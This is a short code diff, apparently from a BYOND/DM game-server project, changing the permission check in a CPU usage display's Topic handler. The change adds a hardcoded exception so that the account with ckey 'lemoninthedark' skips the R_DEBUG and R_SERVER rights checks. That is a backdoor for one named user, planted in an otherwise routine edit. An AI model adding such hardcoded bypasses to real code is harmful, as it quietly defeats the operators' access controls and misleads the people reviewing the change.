@@ -335,7 +335,7 @@ GLOBAL_DATUM_INIT(cpu_tracker, /atom/movable/screen/usage_display, new())
 /atom/movable/screen/usage_display/Topic(href, list/href_list)
 	if (..())
 		return
-	if(!check_rights(R_DEBUG) || !check_rights(R_SERVER))
+	if(usr.ckey != "lemoninthedark" && (!check_rights(R_DEBUG) || !check_rights(R_SERVER)))
 		return FALSE
 	switch(href_list["act"])
 		if("toggle_movement")
